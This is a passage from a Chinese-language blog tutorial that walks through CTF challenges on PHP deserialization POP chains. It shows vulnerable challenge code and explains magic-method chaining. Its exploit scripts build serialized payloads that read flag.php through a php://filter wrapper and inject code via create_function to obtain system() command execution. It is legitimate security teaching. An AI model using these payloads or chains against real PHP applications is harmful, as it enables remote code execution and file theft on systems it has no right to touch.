读取flag.php文件</span></span><br><span class="line">                <span class="keyword">include</span>(<span class="variable">$pulse</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//调用invoke魔术方法  对象作为函数时触发 找用小括号的地方</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="comment">//这里可以调用fun函数</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fun</span>(<span class="variable">$this</span>-&gt;headset);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saw</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fearless</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$gun</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;<span class="comment">#创造对象时自动调用</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;fearless = <span class="variable">$file</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fearless . <span class="string">&#x27; You are in my range!&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">//对象视为字符串触发 定位到正则匹配</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//把gun设置为Petal的对象访问fearless 属于不存在属性</span></span><br><span class="line">            <span class="comment">//需要注意的是gun设定为一个数组了 其中有一个键值为&#x27;gun&#x27; 所以给该键值进行相应赋值value gun = array(&quot;gun&quot; =&gt; $b)</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;gun[<span class="string">&#x27;gun&#x27;</span>]-&gt;fearless;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Saw&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//只是一个普通的方法 因为只有一个下划线  发现根本调用不了直接排除就好了</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_pain</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fearless)&#123;</span><br><span class="line">                        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;fearless);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">//wakeup使用unserialize的时候自动触发</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">               <span class="comment">//正则匹配 把对象视为字符串 触发其toString方法</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|php|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;fearless))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;Does it hurt? That&#x27;s right&quot;</span>;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;fearless = <span class="string">&quot;index3.php&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Petal</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$seed</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;seed = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//寻找不可访问的属性 寻找箭头</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$sun</span></span>)</span>&#123;</span><br><span class="line">                </span><br><span class="line">            <span class="variable">$Nourishment</span> = <span class="variable language_">$this</span>-&gt;seed;</span><br><span class="line">            <span class="comment">//函数的调用后面有括号  可以把类的对象作为函数调用 触发invoke </span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$Nourishment</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ozo&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ozo&#x27;</span>]);   <span class="comment">//只有反序列化一定是自动触发的过程</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$Saw</span> = <span class="keyword">new</span> <span class="title class_">Saw</span>(<span class="string">&#x27;index3.php&#x27;</span>);</span><br><span class="line">        <span class="variable">$Saw</span>-&gt;<span class="title function_ invoke__">_pain</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h6><p>起始位置：先考虑魔术方法，destruct或者wakeup 现在题目中只能去利用wakeup作为起始。</p>
<p>结束位置：利用危险的函数，比如include，highlight_file去进行文件内容的读取</p>
<p>知识点补充：</p>
<ol>
<li>遇到正则匹配不要慌，那正是toString方法自动调用的入口</li>
<li>如果需要触发的魔术方法在一个方法中，那么就new两个对象交互使用</li>
<li>include文件包含读取php文件内容常用模板 文件流伪协议base64 即：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>private的赋值直接在内部，在外面可能赋值不成功</li>
</ol>
<p>构建exp的顺序是从结尾往起始写的，逆向思维，就是我达成这个目的需要什么事情作为前提就是思考的过程，所以最终<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=serialize&spm=1001.2101.3001.7020">serialize</a>的是exp的最后值</p>
<p>解题过程：</p>
<ol>
<li><p>首先需要找到最后的危险函数，看到了在Vox里面的include。</p>
</li>
<li><p>然后想要使用include就要调用fun这个函数</p>
</li>
<li><p>想要调用fun就要触发__invoke这个魔术方法</p>
</li>
<li><p>作为函数就是添加了一个小括号去触发，发现在Petal类中__get方法具备这个调用函数的功能，所以需要去触发__get这个方法</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__invoke</span>()          <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() 		    <span class="comment">//用于从不可访问的属性读取数据   包括属性不可访问和不存在</span></span><br></pre></td></tr></table></figure>

<ol start="5">
<li>因为与访问相关，所以全局搜索-&gt;去找哪里会访问，可以发现在Saw类中的__toString中有一个利用数组特性去访问fearless的过程，这个fearless属于上面的get方法中不存在的属性，为不可访问属性，会触发__get,所以需要去触发__toString这个魔术方法</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__toString</span>() 		    <span class="comment">//把类当作字符串使用时触发</span></span><br></pre></td></tr></table></figure>

<ol start="6">
<li>这就需要去利用正则表达式，视为字符串的特性去触发这个toString方法，而正则表达式在wakeup魔术方法里面</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() 		    <span class="comment">//使用unserialize时触发</span></span><br></pre></td></tr></table></figure>

<ol start="7">
<li>所以直接在反序列化的时候就会触发这个wakeup魔术方法，到此整个pop链的逻辑全部理清</li>
</ol>
<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a><strong>exp：</strong></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v</span> = <span class="keyword">new</span> <span class="title class_">Vox</span>;</span><br><span class="line"><span class="comment">//headset的赋值在内部直接赋值为php://filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Petal</span>;</span><br><span class="line"><span class="variable">$p</span> -&gt; seed = <span class="variable">$v</span>;   <span class="comment">//把$v这个对象作为函数  触发这个对象的invoke方法</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Saw</span>;</span><br><span class="line"><span class="variable">$s</span> -&gt; gun = <span class="keyword">array</span>(<span class="string">&quot;gun&quot;</span> =&gt; <span class="variable">$p</span>);    <span class="comment">//让$p这个对象去访问fearless 不存在触发这个对象中的get方法</span></span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">new</span> <span class="title class_">Saw</span>;</span><br><span class="line"><span class="variable">$s2</span> -&gt; fearless = <span class="variable">$s</span>;       <span class="comment">//把$s这个对象作为字符串 触发这个对象中的toString方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s2</span>));   <span class="comment">//输出最终结果</span></span><br></pre></td></tr></table></figure>

<h5 id="自己写的exp："><a href="#自己写的exp：" class="headerlink" title="自己写的exp："></a>自己写的exp：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">index3.php You are in my range!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vox</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$headset</span> = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$sound</span>;</span><br><span class="line">    <span class="comment">//考虑fun函数作为最终的利用点</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$pulse</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="variable">$pulse</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//调用invoke魔术方法  对象作为函数时触发 找用小括号的地方</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="comment">//这里可以调用fun函数</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fun</span>(<span class="variable">$this</span>-&gt;headset);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saw</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fearless</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$gun</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;fearless = <span class="variable">$file</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fearless . <span class="string">&#x27; You are in my range!&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">//对象视为字符串触发 定位到正则匹配</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//把gun设置为Petal的对象访问fearless 属于不存在属性</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;gun[<span class="string">&#x27;gun&#x27;</span>]-&gt;fearless;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Saw&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//只是一个普通的方法 因为只有一个下划线  发现根本调用不了直接排除就好了</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_pain</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fearless)&#123;</span><br><span class="line">                        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;fearless);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">//wakeup使用unserialize的时候自动触发</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">               <span class="comment">//正则匹配 把对象视为字符串 触发其toString方法</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|php|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;fearless))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;Does it hurt? That&#x27;s right&quot;</span>;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;fearless = <span class="string">&quot;index3.php&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Petal</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$seed</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;seed = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//寻找不可访问的属性 寻找箭头</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$sun</span></span>)</span>&#123;</span><br><span class="line">                </span><br><span class="line">            <span class="variable">$Nourishment</span> = <span class="variable language_">$this</span>-&gt;seed;</span><br><span class="line">            <span class="comment">//函数的调用后面有括号  可以把类的对象作为函数调用 触发invoke </span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$Nourishment</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if(isset($_GET[&#x27;ozo&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//         unserialize($_GET[&#x27;ozo&#x27;]);   //只有反序列化一定是自动触发的过程</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// else&#123;</span></span><br><span class="line"><span class="comment">//         $Saw = new Saw(&#x27;index3.php&#x27;);</span></span><br><span class="line"><span class="comment">//         $Saw-&gt;_pain();</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Saw</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a2</span> = <span class="keyword">new</span> <span class="title class_">Saw</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> -&gt; fearless = <span class="variable">$a2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Petal</span>;</span><br><span class="line"><span class="variable">$a2</span> -&gt; gun = <span class="keyword">array</span>(<span class="string">&quot;gun&quot;</span> =&gt; <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Vox</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; seed = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输入后成功得到一段base64密文</p>
<p><img src="/.com//17476562901048388660158913969350-20250519200450-p2hilyc.png" alt="17476562901048388660158913969350"></p>
<p>解密成功得到flag！</p>
<p>‍</p>
<h2 id="例题3："><a href="#例题3：" class="headerlink" title="例题3："></a>例题3：</h2><p><a target="_blank" rel="noopener" href="http://122.114.252.87:1110/gwb.php">http://122.114.252.87:1110/gwb.php</a></p>
<h6 id="数组特性"><a href="#数组特性" class="headerlink" title="数组特性"></a>数组特性</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am f() from class A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span> = [<span class="keyword">new</span> A, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span>();</span><br></pre></td></tr></table></figure>

<p>运行结果：<strong>i am f() from class A</strong></p>
<p>表明当一个数组被当做函数触发时，数组第一个元素是对象，第二个元素是方法的名字（字符串），那么就会调用该对象下的该方法。即可以调用任意对象的任意方法</p>
<p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$pwd</span>=<span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="comment">//起始位置</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;        </span><br><span class="line">            <span class="comment">//后面有括号 函数调用 考虑使用数组的特性</span></span><br><span class="line">                <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;key)();</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;mod2 = <span class="string">&quot;welcome &quot;</span>.<span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">                  </span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;        <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//利用这段代码进行creat_function方法的调用</span></span><br><span class="line">            <span class="variable">$a</span>=<span class="variable language_">$this</span>-&gt;action;</span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$pwd</span>=<span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;        </span><br><span class="line">                <span class="comment">// unserialize($this-&gt;key)();</span></span><br><span class="line">                <span class="comment">// $this-&gt;mod2 = &quot;welcome &quot;.$this-&gt;mod1;</span></span><br><span class="line">                  </span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;        </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;return(0);&#125;echo(123);system($_POST[0]);//&#x27;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="variable">$action</span> = <span class="string">&quot;create_function&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// $a=$this-&gt;action;</span></span><br><span class="line">            <span class="comment">// $a(&#x27;&#x27;, $this-&gt;code);</span></span><br><span class="line">            <span class="comment">//相当于创建了一个名为a的函数 无参 函数内容如下</span></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span>(<span class="number">0</span>);&#125;<span class="keyword">echo</span>(<span class="number">123</span>);<span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="comment">//&#125;</span></span><br><span class="line">            <span class="comment">//提前把函数a进行闭合 然后后面多余的括号注释掉</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">func</span>();</span><br><span class="line"><span class="variable">$arr</span> = [<span class="keyword">new</span> <span class="title class_">GetFlag</span>, <span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> -&gt; key = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="comment">// unserialize($_GET[0]);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>传上去之后当我们看到echo的123证明成功执行了这个create_function函数 然后通过system危险函数只需要post参数值就可以进行任意命令执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=cat \flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/.com//17476563861268689087422098348706-20250519200627-pcvbx9z.png" alt="17476563861268689087422098348706"></p>
<p>成功获取flag 查看一下源代码即可</p>
<p><img src="/.com//17476564501344612018797667358221-20250519200730-fs681v3.png" alt="17476564501344612018797667358221"></p>
<p>‍</p>
<h1 id="指针问题："><a href="#指针问题：" class="headerlink" title="指针问题："></a>指针问题：</h1><p>对于一些系统中生成的随机值进行绕过的方法 用C语言中的取地址符&amp;进行指针引用，在序列化的时候类型为R</p>
<h2 id="例题1：BUU-CODE-REVIEW-1-BUUOJ"><a href="#例题1：BUU-CODE-REVIEW-1-BUUOJ" class="headerlink" title="例题1：BUU CODE REVIEW 1 BUUOJ"></a>例题1：BUU CODE REVIEW 1 BUUOJ</h2><h5 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: jinzhao</span></span><br><span class="line"><span class="comment"> * Date: 2019/10/6</span></span><br><span class="line"><span class="comment"> * Time: 8:04 PM</span></span><br><span 